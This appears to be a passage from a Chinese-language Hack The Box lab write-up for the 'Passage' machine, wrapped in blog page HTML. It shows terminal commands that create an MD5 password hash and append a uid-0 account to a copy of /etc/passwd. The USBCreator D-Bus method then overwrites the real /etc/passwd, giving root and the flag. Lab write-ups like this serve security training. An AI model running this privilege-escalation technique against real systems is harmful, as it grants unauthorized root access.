passwd<br>nadav@passage:~$ openssl passwd -1 shiyan<br>$1<span class="hljs-variable">$z5ZN2u</span>.x<span class="hljs-variable">$d2Dxv6yt5qcCgkSvjalhG</span>.<br>nadav@passage:~$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;$1$z5ZN2u.x$d2Dxv6yt5qcCgkSvjalhG.:0:0:pwned:/root:/bin/bash&#x27;</span> &gt;&gt; passwd <br>nadav@passage:~$ <span class="hljs-built_in">tail</span> -3 /etc/passwd<br>nadav:x:1000:1000:Nadav,,,:/home/nadav:/bin/bash<br>paul:x:1001:1001:Paul Coles,,,:/home/paul:/bin/bash<br>sshd:x:121:65534::/var/run/sshd:/usr/sbin/nologin<br>nadav@passage:~$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;shiyan:$1$z5ZN2u.x$d2Dxv6yt5qcCgkSvjalhG.:0:0:pwned:/root:/bin/bash&#x27;</span> &gt;&gt; passwd <br>nadav@passage:~$ <span class="hljs-built_in">tail</span> -3 /etc/passwd<br>nadav:x:1000:1000:Nadav,,,:/home/nadav:/bin/bash<br>paul:x:1001:1001:Paul Coles,,,:/home/paul:/bin/bash<br>sshd:x:121:65534::/var/run/sshd:/usr/sbin/nologin<br>nadav@passage:~$ <span class="hljs-built_in">tail</span> /etc/passwd<br>speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false<br>hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false<br>kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false<br>pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false<br>rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false<br>saned:x:119:127::/var/lib/saned:/bin/false<br>usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false<br>nadav:x:1000:1000:Nadav,,,:/home/nadav:/bin/bash<br>paul:x:1001:1001:Paul Coles,,,:/home/paul:/bin/bash<br>sshd:x:121:65534::/var/run/sshd:/usr/sbin/nologin<br>nadav@passage:~$ <span class="hljs-built_in">ls</span><br>Desktop    Downloads  Pictures  Templates  examples.desktop<br>Documents  Music      Public    Videos     passwd<br>nadav@passage:~$ <span class="hljs-built_in">cat</span> passwd <br>root:x:0:0:root:/root:/bin/bash<br>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br>bin:x:2:2:bin:/bin:/usr/sbin/nologin<br>sys:x:3:3:sys:/dev:/usr/sbin/nologin<br><span class="hljs-built_in">sync</span>:x:4:65534:<span class="hljs-built_in">sync</span>:/bin:/bin/sync<br>games:x:5:60:games:/usr/games:/usr/sbin/nologin<br>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin<br>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br>systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false<br>systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false<br>systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false<br>systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false<br>syslog:x:104:108::/home/syslog:/bin/false<br>_apt:x:105:65534::/nonexistent:/bin/false<br>messagebus:x:106:110::/var/run/dbus:/bin/false<br>uuidd:x:107:111::/run/uuidd:/bin/false<br>lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false<br>whoopsie:x:109:117::/nonexistent:/bin/false<br>avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false<br>avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false<br>dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false<br>colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false<br>speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false<br>hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false<br>kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false<br>pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false<br>rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false<br>saned:x:119:127::/var/lib/saned:/bin/false<br>usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false<br>nadav:x:1000:1000:Nadav,,,:/home/nadav:/bin/bash<br>paul:x:1001:1001:Paul Coles,,,:/home/paul:/bin/bash<br>sshd:x:121:65534::/var/run/sshd:/usr/sbin/nologin<br>$1<span class="hljs-variable">$z5ZN2u</span>.x<span class="hljs-variable">$d2Dxv6yt5qcCgkSvjalhG</span>.:0:0:pwned:/root:/bin/bash<br>shiyan:$1<span class="hljs-variable">$z5ZN2u</span>.x<span class="hljs-variable">$d2Dxv6yt5qcCgkSvjalhG</span>.:0:0:pwned:/root:/bin/bash<br>nadav@passage:~$ <span class="hljs-built_in">pwd</span><br>/home/nadav<br>nadav@passage:~$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /home/nadav/passwd /etc/passwd <span class="hljs-literal">true</span><br>()<br>nadav@passage:~$ <span class="hljs-built_in">tail</span> -3 /etc/passwd<br>sshd:x:121:65534::/var/run/sshd:/usr/sbin/nologin<br>$1<span class="hljs-variable">$z5ZN2u</span>.x<span class="hljs-variable">$d2Dxv6yt5qcCgkSvjalhG</span>.:0:0:pwned:/root:/bin/bash<br>shiyan:$1<span class="hljs-variable">$z5ZN2u</span>.x<span class="hljs-variable">$d2Dxv6yt5qcCgkSvjalhG</span>.:0:0:pwned:/root:/bin/bash<br>nadav@passage:~$ su -shiyan<br>Password: <br>su: Authentication failure<br>nadav@passage:~$ su -shiyan<br>Password: <br>su: Authentication failure<br>nadav@passage:~$<br></code></pre></td></tr></table></figure>
+
+<p>31、切换下用户，获取下最终的flag信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">nadav@passage:~$ su shiyan<br>Password: <br>root@passage:/home/nadav<span class="hljs-comment"># id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br>root@passage:/home/nadav<span class="hljs-comment"># cat /root/root.txt</span><br>abbe695cf002028f0d9965796e775e52<br>root@passage:/home/nadav<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure>
+
+
+<h4 id="0x03-通关凭证展示"><a href="#0x03-通关凭证展示" class="headerlink" title="0x03 通关凭证展示"></a>0x03 通关凭证展示</h4><p><code>https://www.hackthebox.com/achievement/machine/1705469/275</code></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%89%93%E9%9D%B6%E8%AE%B0/" class="category-chain-item">打靶记</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/shooting-range/" class="print-no-link">#shooting-range</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Passage-htb-writeup</div>
+      <div>https://sh1yan.top/2024/01/12/Passage-htb-writeup/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>shiyan</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年1月12日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/01/13/Time-htb-writeup/" title="Time-htb-writeup">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Time-htb-writeup</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/01/10/Magic-htb-writeup-htb-writeup/" title="Magic-htb-writeup">
+                        <span class="hidden-mobile">Magic-htb-writeup</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a  rel="nofollow noopener"><span>Copyrights &copy; 2016-2024</span></a> <i class="iconfont icon-love"></i> <a  rel="nofollow noopener"><span>shiyan</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
